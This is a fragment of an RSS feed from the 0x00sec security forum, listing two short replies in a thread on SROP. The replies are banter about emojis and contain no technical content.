        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <p>Of course i do! <img src="https://0x00sec.org/images/emoji/twitter/joy_cat.png?v=9" title=":joy_cat:" class="emoji" alt=":joy_cat:"></p>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/3</link>
        <pubDate>Tue, 11 Jul 2017 19:33:13 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-3</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
      <item>
        <title>SROP | Signals, you say?</title>
        <dc:creator><![CDATA[M3r8]]></dc:creator>
        <description><![CDATA[
            <p>do you like emojis ?<img src="https://0x00sec.org/images/emoji/twitter/sunglasses.png?v=9" title=":sunglasses:" class="emoji" alt=":sunglasses:"></p>
          <p><a href="https://0x00sec.org/t/srop-signals-you-say/2890/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/srop-signals-you-say/2890/2</link>
        <pubDate>Tue, 11 Jul 2017 19:32:26 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-2890-2</guid>
        <source url="https://0x00sec.org/t/srop-signals-you-say/2890.rss">SROP | Signals, you say?</source>
      </item>
  </channel>
</rss>
